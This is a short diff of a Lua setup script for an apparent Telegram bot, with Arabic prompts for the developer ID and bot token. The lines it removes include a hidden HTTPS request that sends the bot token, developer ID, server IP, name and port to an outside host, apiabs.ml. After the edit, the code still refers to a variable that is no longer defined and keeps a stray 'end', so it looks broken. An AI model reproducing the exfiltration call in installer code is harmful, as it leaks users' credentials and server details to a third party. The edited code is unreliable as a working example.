@@ -25,10 +25,6 @@ if not DevRio:get(Server.."IdAntak") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-if res == 200 then
-Abs = json:decode(data)
-if Abs.Result.Info =='Is_Spam' then
-os.execute('lua Antak-Fatime.lua') 
 end ---ifBn
 if Abs.Result.Info =='Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
@@ -75,7 +71,6 @@ Antak = DevRio:get(Server.."TokenAntak"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdAntak")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdAntak").."&TokenBot="..DevRio:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Antak-Fatime.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
